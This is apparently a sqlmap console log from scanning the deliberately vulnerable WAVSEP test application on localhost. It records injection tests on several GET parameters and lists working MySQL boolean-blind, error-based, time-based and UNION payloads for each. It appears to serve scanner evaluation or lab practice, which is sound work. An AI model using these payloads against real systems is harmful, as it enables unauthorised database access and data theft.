[05:06:02] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:06:02] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:06:02] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:06:02] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:06:03] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:06:03] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:06:03] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:06:03] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:06:03] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:06:03] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:06:03] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:06:03] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 726 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: transactionDate=2010-01-01' AND 6317=(SELECT (CASE WHEN (6317=6317) THEN 6317 ELSE (SELECT 5675 UNION SELECT 1334) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-01-01' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170626271,(SELECT (ELT(2655=2655,1))),0x716b6b7a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- NOgo

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 9452 FROM (SELECT(SLEEP(5)))tqqy)-- xeaf
---
do you want to exploit this SQL injection? [Y/n] Y
[05:06:03] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:06:03] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 501 times
[61/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp?transactionDate=2010-02-02
do you want to test this URL? [Y/n/q]
> Y
[05:06:03] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp?transactionDate=2010-02-02'                                                                                                 
[05:06:03] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=97B75150D2F...0EA947282A'). Do you want to use those [Y/n] Y
[05:06:03] [INFO] testing if GET parameter 'transactionDate' is dynamic
[05:06:03] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[05:06:03] [INFO] heuristic (basic) test shows that GET parameter 'transactionDate' might be injectable (possible DBMS: 'MySQL')
[05:06:03] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[05:06:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:06:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:06:04] [WARNING] reflective value(s) found and filtering out
[05:06:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:06:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:06:05] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:06:05] [INFO] testing 'Generic inline queries'
[05:06:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:06:05] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:06:05] [INFO] testing 'MySQL inline queries'
[05:06:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:06:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:06:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:06:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:06:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:06:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:06:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:06:15] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:06:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:06:15] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:06:15] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:06:15] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:06:15] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:06:15] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:06:16] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:06:16] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:06:16] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:06:16] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:06:16] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:06:16] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:06:16] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:06:16] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:06:16] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:06:16] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:06:17] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:06:17] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:06:17] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:06:17] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:06:17] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 711 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: transactionDate=2010-02-02' AND 8604=(SELECT (CASE WHEN (8604=8604) THEN 8604 ELSE (SELECT 3645 UNION SELECT 4094) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-02-02' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178717671,(SELECT (ELT(9869=9869,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- CdCc

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-02-02' AND (SELECT 8807 FROM (SELECT(SLEEP(5)))vosa)-- CHZE
---
do you want to exploit this SQL injection? [Y/n] Y
[05:06:17] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:06:17] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 503 times
[62/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp?transactionDate=2010-02-02
do you want to test this URL? [Y/n/q]
> Y
[05:06:17] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp?transactionDate=2010-02-02'                                                                                        
[05:06:17] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=CABB61B0944...643969C363'). Do you want to use those [Y/n] Y
[05:06:17] [INFO] testing if GET parameter 'transactionDate' is dynamic
[05:06:17] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[05:06:17] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[05:06:17] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[05:06:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:06:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:06:18] [WARNING] reflective value(s) found and filtering out
[05:06:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:06:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:06:19] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:06:19] [INFO] testing 'Generic inline queries'
[05:06:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:06:19] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:06:19] [INFO] testing 'MySQL inline queries'
[05:06:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:06:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:06:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:06:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:06:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:06:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:06:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:06:29] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:06:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:06:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:06:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:06:29] [INFO] target URL appears to have 4 columns in query
[05:06:29] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[05:06:29] [WARNING] automatically patching output having last char trimmed
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 329 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: transactionDate=2010-02-02 AND 8445=(SELECT (CASE WHEN (8445=8445) THEN 8445 ELSE (SELECT 1919 UNION SELECT 7611) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-02-02 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71717a7671,(SELECT (ELT(7737=7737,1))),0x7176767a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-02-02 AND (SELECT 6743 FROM (SELECT(SLEEP(5)))doZX)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionDate=2010-02-02 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71717a7671,0x50786747665670497149696553634b426259656656484148646d785778427a425952756773576770,0x7176767a71)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[05:06:29] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:06:29] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 94 times
[63/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp?transactionId=132
do you want to test this URL? [Y/n/q]
> Y
[05:06:29] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp?transactionId=132'                                                                                            
[05:06:29] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=DF6AA66D6E3...D66C6A5006'). Do you want to use those [Y/n] Y
[05:06:29] [INFO] testing if GET parameter 'transactionId' is dynamic
[05:06:29] [WARNING] GET parameter 'transactionId' does not appear to be dynamic
[05:06:29] [WARNING] heuristic (basic) test shows that GET parameter 'transactionId' might not be injectable
[05:06:29] [INFO] testing for SQL injection on GET parameter 'transactionId'
[05:06:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:06:29] [WARNING] reflective value(s) found and filtering out
[05:06:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:06:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:06:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:06:30] [INFO] GET parameter 'transactionId' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:06:30] [INFO] testing 'Generic inline queries'
[05:06:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:06:30] [INFO] GET parameter 'transactionId' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:06:30] [INFO] testing 'MySQL inline queries'
[05:06:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:06:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:06:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:06:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:06:30] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:06:30] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:06:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:06:40] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:06:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:06:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:06:40] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:06:40] [INFO] target URL appears to have 4 columns in query
[05:06:40] [INFO] GET parameter 'transactionId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 326 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: transactionId=132 AND 4581=(SELECT (CASE WHEN (4581=4581) THEN 4581 ELSE (SELECT 3524 UNION SELECT 4111) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionId=132 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178627871,(SELECT (ELT(2213=2213,1))),0x7178716b71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=132 AND (SELECT 6919 FROM (SELECT(SLEEP(5)))nzYu)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionId=132 UNION ALL SELECT NULL,NULL,CONCAT(0x7178627871,0x515156466259444a726f715168694579485951684f7753684d455678716c6c67716a6272714b6849,0x7178716b71),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[05:06:40] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:06:40] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 87 times
[64/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp?msgId=1
do you want to test this URL? [Y/n/q]
> Y
[05:06:40] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp?msgId=1'                                                                                                        
[05:06:40] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=BC8756C06F1...63BF09C031'). Do you want to use those [Y/n] Y
[05:06:40] [INFO] testing if GET parameter 'msgId' is dynamic
[05:06:40] [WARNING] GET parameter 'msgId' does not appear to be dynamic
[05:06:40] [WARNING] heuristic (basic) test shows that GET parameter 'msgId' might not be injectable
[05:06:40] [INFO] testing for SQL injection on GET parameter 'msgId'
[05:06:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:06:41] [WARNING] reflective value(s) found and filtering out
[05:06:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:06:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:06:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:06:42] [INFO] GET parameter 'msgId' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:06:42] [INFO] testing 'Generic inline queries'
[05:06:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:06:42] [INFO] GET parameter 'msgId' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:06:42] [INFO] testing 'MySQL inline queries'
[05:06:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:06:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:06:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:06:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:06:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:06:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:06:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:06:52] [INFO] GET parameter 'msgId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:06:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:06:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:06:52] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:06:52] [INFO] target URL appears to have 3 columns in query
[05:06:52] [INFO] GET parameter 'msgId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'msgId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 327 HTTP(s) requests:
---
Parameter: msgId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msgId=1 AND 7371=(SELECT (CASE WHEN (7371=7371) THEN 7371 ELSE (SELECT 9469 UNION SELECT 2505) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msgId=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b706b71,(SELECT (ELT(4653=4653,1))),0x716a706b71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgId=1 AND (SELECT 8820 FROM (SELECT(SLEEP(5)))vqhL)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: msgId=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b706b71,0x73624f52667a4f5244744949656967706857716c4c77755a434c717042667267487946784d545a52,0x716a706b71)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[05:06:52] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:06:52] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 87 times
[65/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp?minBalanace=10000
do you want to test this URL? [Y/n/q]
> Y
[05:06:52] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp?minBalanace=10000'                                                                                              
[05:06:52] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=F258B33FFD9...70DAE55730'). Do you want to use those [Y/n] Y
[05:06:52] [INFO] testing if GET parameter 'minBalanace' is dynamic
[05:06:52] [WARNING] GET parameter 'minBalanace' does not appear to be dynamic
[05:06:52] [WARNING] heuristic (basic) test shows that GET parameter 'minBalanace' might not be injectable
[05:06:52] [INFO] testing for SQL injection on GET parameter 'minBalanace'
[05:06:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:06:52] [WARNING] reflective value(s) found and filtering out
[05:06:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:06:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:06:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:06:53] [INFO] GET parameter 'minBalanace' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:06:53] [INFO] testing 'Generic inline queries'
[05:06:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:06:53] [INFO] GET parameter 'minBalanace' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:06:53] [INFO] testing 'MySQL inline queries'
[05:06:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:06:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:06:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:06:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:06:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:06:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:06:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:07:03] [INFO] GET parameter 'minBalanace' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:07:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:07:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:07:03] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:07:03] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[05:07:03] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:07:04] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:07:04] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:07:04] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:07:04] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:07:04] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:07:04] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:07:04] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:07:04] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:07:04] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:07:04] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:07:04] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:07:04] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:07:05] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:07:05] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:07:05] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:07:05] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:07:05] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:07:05] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'minBalanace' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 723 HTTP(s) requests:
---
Parameter: minBalanace (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: minBalanace=10000 AND 5410=(SELECT (CASE WHEN (5410=5410) THEN 5410 ELSE (SELECT 2926 UNION SELECT 5262) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: minBalanace=10000 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707671,(SELECT (ELT(5573=5573,1))),0x71767a7a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: minBalanace=10000 AND (SELECT 4687 FROM (SELECT(SLEEP(5)))nIbl)
---
do you want to exploit this SQL injection? [Y/n] Y
[05:07:05] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:07:05] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 491 times
[66/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp?msgid=1
do you want to test this URL? [Y/n/q]
> Y
[05:07:05] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp?msgid=1'                                                                                                    
[05:07:05] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=A964B3821C0...E4045E3429'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: msgid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msgid=1 AND 7447=(SELECT (CASE WHEN (7447=7447) THEN 7447 ELSE (SELECT 7508 UNION SELECT 6761) END))-- jupw

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msgid=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(7657=7657,1))),0x717a6a7171,0x78))s), 8446744073709551610, 8446744073709551610)))
---
do you want to exploit this SQL injection? [Y/n] Y
[05:07:05] [INFO] testing MySQL
[05:07:05] [INFO] confirming MySQL
[05:07:05] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.0
[05:07:05] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 11 times
[67/68] URL:
GET http://localhost:8080/examples/jsp/jsp2/el/implicit-objects.jsp?foo=bar
do you want to test this URL? [Y/n/q]
> Y
[05:07:05] [INFO] testing URL 'http://localhost:8080/examples/jsp/jsp2/el/implicit-objects.jsp?foo=bar'
[05:07:05] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=96BC178E3C6...0855205FB2'). Do you want to use those [Y/n] Y
[05:07:06] [INFO] testing if GET parameter 'foo' is dynamic
[05:07:06] [WARNING] GET parameter 'foo' does not appear to be dynamic
[05:07:06] [WARNING] heuristic (basic) test shows that GET parameter 'foo' might not be injectable
[05:07:06] [INFO] testing for SQL injection on GET parameter 'foo'
[05:07:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:07:06] [WARNING] reflective value(s) found and filtering out
